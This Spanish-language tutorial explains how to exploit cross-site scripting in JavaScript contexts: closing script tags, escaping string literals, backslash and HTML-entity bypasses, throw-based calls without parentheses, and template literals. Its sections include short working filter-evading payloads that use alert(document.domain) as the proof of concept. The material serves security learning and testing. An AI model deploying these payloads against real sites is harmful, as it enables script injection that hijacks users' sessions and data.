# XSS en JavaScript

Cuando el contexto de una vulnerabilidad XSS se encuentra en algún bloque de JavaScript dentro de la respuesta HTML, pueden surgir diversas situaciones que requieren diferentes técnicas de explotación.

## Terminar el script existente

En el caso más simple, es posible cerrar la etiqueta `<script>` que contiene el JavaScript y luego introducir etiquetas HTML que disparen la ejecución de código JavaScript. Por ejemplo:

```html
<script>
  var input = 'controllable data here';
</script>
```

Payload de ejemplo:

```html
</script><img src=1 onerror=alert(document.domain)>
```

Esto funciona porque el navegador primero analiza el HTML (identifica etiquetas como `<script>`, `<img>`, etc.) y luego analiza el contenido JavaScript. Aunque el script queda dañado, esto no impide que el navegador ejecute lo que sigue.

## Salir de una cadena de JavaScript

Cuando el contexto está dentro de una cadena JavaScript entre comillas, se puede salir de ella y ejecutar código arbitrario. Es fundamental mantener el resto del código sintácticamente válido.

Ejemplos de payloads:

```javascript
'-alert(document.domain)-'
';alert(document.domain)//
```

### Escapando barras invertidas

Algunas aplicaciones intentan prevenir esto escapando comillas con barras invertidas. Si no escapan la barra invertida correctamente, el atacante puede aprovecharlo:

Entrada:
```javascript
';alert(document.domain)//
```

Escapada por la app:
```javascript
\';alert(document.domain)//
```

Esto permite romper la cadena e inyectar código.

## Uso de `throw` para evitar paréntesis

En situaciones donde están filtrados ciertos caracteres como `(` y `)`, se puede usar `throw` con un manejador de errores global:

```javascript
onerror=alert;throw 1
```

Esto llama a `alert(1)` sin necesidad de paréntesis.

## Haciendo uso de la codificación HTML

Si el contexto está en un atributo HTML como `onclick`, y la app filtra caracteres como `'`, se puede usar entidades HTML:

```html
<a href="#" onclick="... var input='controllable data here'; ...">
```

Payload codificado:
```html
&apos;-alert(document.domain)-&apos;
```

El navegador decodifica `&apos;` como comillas simples, permitiendo cerrar la cadena e inyectar código.

## XSS en literales de plantilla de JavaScript

Los literales de plantilla se definen con comillas invertidas `` ` `` y permiten interpolación de variables:

```javascript
document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
```

Si el contexto está dentro de un literal de plantilla, se puede usar:

```javascript
${alert(document.domain)}
```

Esto ejecuta código sin necesidad de romper la plantilla.

## XSS mediante inyección de plantilla del lado del cliente

Frameworks como AngularJS permiten plantillas dinámicas en el cliente. Si la app inyecta datos del usuario sin sanearlos, se pueden inyectar expresiones de plantilla maliciosas para ejecutar JavaScript.

---

Este documento resume técnicas para explotar XSS en contextos de JavaScript, incluyendo scripts embebidos, literales de cadena y plantilla, y atributos HTML. Estas técnicas son clave para evadir filtros y lograr la ejecución de código en aplicaciones vulnerables.


